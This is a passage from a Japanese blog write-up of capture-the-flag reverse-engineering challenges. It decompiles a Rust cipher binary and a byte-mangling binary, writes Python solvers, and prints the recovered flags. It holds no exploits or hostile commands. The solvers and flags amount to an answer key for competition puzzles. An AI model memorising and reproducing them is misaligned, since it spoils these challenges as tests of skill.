    ptr <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>文字数は 30 程度でしたので、Solver ではなく手動で以下の Flag を特定しました。</p>
<p><code class="language-text">ictf{1_h4t3_3s0l4ng5_7d4f3a1b}</code></p>
<h2 id="rustrev" style="position:relative;"><a href="#rustrev" aria-label="rustrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Rust(Rev)</h2>
<blockquote>
<p>Rust! Enjoy 😃 Note: The message that produces the provided encryption is the flag.</p>
</blockquote>
<p>問題バイナリとして Rust バイナリと、Flag を暗号化した結果が与えられます。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">Enter the message:REDACTED
Enter the key <span class="token punctuation">(</span>in hex<span class="token punctuation">)</span>: REDACTED
Encrypted: <span class="token punctuation">[</span>-42148619422891531582255418903, -42148619422891531582255418927, -42148619422891531582255418851, -42148619422891531582255418907, -42148619422891531582255418831, -42148619422891531582255418859, -42148619422891531582255418855, -42148619422891531582255419111, -42148619422891531582255419103, -42148619422891531582255418687, -42148619422891531582255418859, -42148619422891531582255419119, -42148619422891531582255418843, -42148619422891531582255418687, -42148619422891531582255419103, -42148619422891531582255418907, -42148619422891531582255419107, -42148619422891531582255418915, -42148619422891531582255419119, -42148619422891531582255418935, -42148619422891531582255418823<span class="token punctuation">]</span></code></pre></div>
<p>頑張って解析を進めた結果、暗号化対象のテキストと、最大 16 バイトのキーを入力として受け取り、いくつかの加工を行っていることがわかりました。</p>
<p>実際の処理のシンプルさに対して Rust バイナリをデコンパイルした結果の複雑さに辟易しつつアセンブリを読み進めると、入力値の 1 文字を 3 つ右シフトした後に 5 つ左シフトを行い、入力されたキーとの XOR をとった後に  0x539 を加算してビット反転を行っていることがわかりました。</p>
<p>そこで、以下の Solver で元の Flag である <code class="language-text">ictf{ru57_r3v_7f4d3a}</code> を復号しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">""</span>
first_8byte_key <span class="token operator">=</span> <span class="token number">0x8830855547373836</span>
part_of_second_key <span class="token operator">=</span> <span class="token number">0x82184000</span>
guessed_key <span class="token operator">=</span> <span class="token number">0x979</span>
enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">42148619422891531582255418903</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418927</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418851</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418907</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418831</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418859</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418855</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255419111</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255419103</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418687</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418859</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255419119</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418843</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418687</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255419103</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418907</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255419107</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418915</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255419119</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418935</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">42148619422891531582255418823</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> e <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">~</span>e <span class="token operator">&amp;</span> <span class="token number">0xFFF</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x539</span>
    tmp <span class="token operator">=</span> tmp <span class="token operator">^</span> guessed_key
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span></code></pre></div>
<h2 id="unconditionalrev" style="position:relative;"><a href="#unconditionalrev" aria-label="unconditionalrev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>unconditional(Rev)</h2>
<blockquote>
<p>Can you reverse this flag mangler? The output is b4,31,8e,02,af,1c,5d,23,98,7d,a3,1e,b0,3c,b3,c4,a6,06,58,28,19,7d,a3,c0,85,31,68,0a,bc,03,5d,3d,0b</p>
<p>The input only contains lowercase letters, numbers, underscore, and braces .</p>
</blockquote>
<p>問題バイナリを実行すると、33 個のバイト列が print されます。</p>
<p>どうやら、この出力結果が  <code class="language-text">b4,31,8e,02,af,1c,5d,23,98,7d,a3,1e,b0,3c,b3,c4,a6,06,58,28,19,7d,a3,c0,85,31,68,0a,bc,03,5d,3d,0b</code> となる何かが正しい Flag になるようです。</p>
<p>問題バイナリのデコンパイル結果を見ると、iterate という関数が 33 回ネストされて実行されています。</p>
<p>この iterate 関数の中では、データ領域にハードコードされている Flag 文字列の先頭から 1 文字ずつ順に取り出し、何らかの計算を行った結果を 1 バイトずつ出力する関数になっています。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token class-name">uint64_t</span> <span class="token function">iterate</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> n<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">uint8_t</span> word <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> rax_28<span class="token punctuation">;</span>
    rax_28 <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> is_even <span class="token operator">=</span> rax_28<span class="token punctuation">;</span>
    <span class="token keyword">char</span> is_lower<span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">&lt;=</span> <span class="token number">0x60</span> <span class="token operator">||</span> word <span class="token operator">></span> <span class="token number">0x7a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        is_lower <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        is_lower <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    
    <span class="token keyword">char</span> X <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>table1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>c1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>word <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>is_lower <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>is_lower <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int8_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span>word<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> table2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>c2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int8_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span>word<span class="token punctuation">)</span> <span class="token operator">>></span> table2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>c2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    flag<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>is_even <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>word <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>is_lower <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>is_lower <span class="token operator">*</span> <span class="token punctuation">(</span>table1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>c1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">^</span> word<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>is_even <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> X<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span>is_even<span class="token punctuation">)</span> <span class="token operator">+</span> c1<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span>is_even<span class="token punctuation">)</span> <span class="token operator">+</span> c2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x,"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>flag<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">int64_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"nothing_here_lmao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token class-name">int32_t</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">int32_t</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">int32_t</span> n <span class="token operator">=</span> <span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> n_1 <span class="token operator">=</span> <span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span><span class="token function">iterate</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">iterate</span><span class="token punctuation">(</span>n_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>Flag の位置には以下の値がデフォルトで埋め込まれています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 456px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/4decb49d247bfccca73263e270405b8a/7f664/image-20240722010026733.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 27.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABOUlEQVQY0z2QbU+CYBiF+VgpyTsPoEH2IgoJYmgtjcqpYdO0za31B/r/v+CK3OrD2Tk727Xd95EaqopmmARBgC1sbL+Ne3FNK4zxrroYloXhNnGr7Lav8HsJui345RRNQ1G1Q/6TdHRSqyCVsCPQmz5OlNHsXeJeBii6TtBsE130CM+7+J5Py2nRrjrDtJAr7rhe46Re/5d03YvI8pTnWcrkYcK63DApCvLykWQwZJiNWBWvTMcT4qhPmmQkNwP6UUISpweF3YhOFBHGMVJ6mzO+v2NTztkulnx/fvK137PYriienpnNl7wuSpbzkt16x0sxY74qKT82LN6q/n3NdDkjG40Y5DnS75k1+RRhOqiajuEIHM9DCFFtq2NVblgmumniuC6y0qAhdLQzG6VyxTPRHJO6LB9e/gGZNJB/Iblw4gAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/4decb49d247bfccca73263e270405b8a/8ac56/image-20240722010026733.webp 240w,
/static/4decb49d247bfccca73263e270405b8a/646b7/image-20240722010026733.webp 456w"
              sizes="(max-width: 456px) 100vw, 456px"
              type="image/webp"
            />
          <source
            srcset="/static/4decb49d247bfccca73263e270405b8a/8ff5a/image-20240722010026733.png 240w,
/static/4decb49d247bfccca73263e270405b8a/7f664/image-20240722010026733.png 456w"
            sizes="(max-width: 456px) 100vw, 456px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/4decb49d247bfccca73263e270405b8a/7f664/image-20240722010026733.png"
            alt="image-20240722010026733"
            title="image-20240722010026733"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>iterate 関数のエンコード結果は 1 文字ごとに決定されるため、単純な総当たりで Flag を取得できそうです。</p>
<p>iterate 関数の処理を以下のような Python スクリプトで再実装し、総当たりで Flag を特定しました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">table1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"RdqQTv"</span><span class="token punctuation">]</span>
table2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">iterate</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    word <span class="token operator">=</span> flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span>
    is_even <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
    is_lower <span class="token operator">=</span> <span class="token number">0</span>
    
    <span class="token keyword">if</span> <span class="token number">0x60</span> <span class="token operator">&lt;</span> word <span class="token operator">&lt;=</span> <span class="token number">0x7a</span><span class="token punctuation">:</span>
        is_lower <span class="token operator">=</span> <span class="token number">1</span>
    
    X <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>table1<span class="token punctuation">[</span>c1<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>is_lower <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
         <span class="token punctuation">(</span>is_lower <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> table2<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>word <span class="token operator">>></span> table2<span class="token punctuation">[</span>c2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>is_even <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>word <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>is_lower <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>
               <span class="token punctuation">(</span>is_lower <span class="token operator">*</span> <span class="token punctuation">(</span>table1<span class="token punctuation">[</span>c1<span class="token punctuation">]</span> <span class="token operator">^</span> word<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>is_even <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> X<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span>
    
    c1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>is_even <span class="token operator">+</span> c1<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span><span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>is_even <span class="token operator">+</span> c2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span><span class="token punctuation">)</span>
    
    <span class="token comment"># print(f"{flag[n]:02x},", end="")</span>
    <span class="token keyword">return</span> flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2

flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"ictf{AAAAAAAAAAAAAAAAAAAAAAAAAAA}"</span><span class="token punctuation">]</span>
ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xb4</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x8e</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xaf</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0x1e</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0xa6</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0xa3</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span><span class="token number">0x3d</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">]</span>
target <span class="token operator">=</span> <span class="token number">5</span>
ret <span class="token operator">=</span> <span class="token string">"ictf{"</span>

<span class="token comment"># ここの順番が重要(複数マッチしてしまうため)</span>
l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"0}{nopqrstuvwxyz_123456789abcdefghijklm"</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> target <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> k <span class="token keyword">in</span> l<span class="token punctuation">:</span>
        c1<span class="token punctuation">,</span>c2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
            x<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2 <span class="token operator">=</span> iterate<span class="token punctuation">(</span>n<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span>
        flag<span class="token punctuation">[</span>target<span class="token punctuation">]</span> <span class="token operator">=</span> k
        x<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2 <span class="token operator">=</span> iterate<span class="token punctuation">(</span>target<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span>
        <span class="token comment"># print(hex(x),chr(k))</span>
        <span class="token keyword">if</span> x <span class="token operator">==</span> ans<span class="token punctuation">[</span>target<span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
            ret <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
            <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>

<span class="token comment"># ictf{m0r3_than_1_way5_t0_c0n7r0l}</span></code></pre></div>
<p>なお、iterate 関数の結果は結構な割合で重複するため、総当たりの検証順序によっては全く違う文字列が出てくる場合がある点に手間取りました。</p>
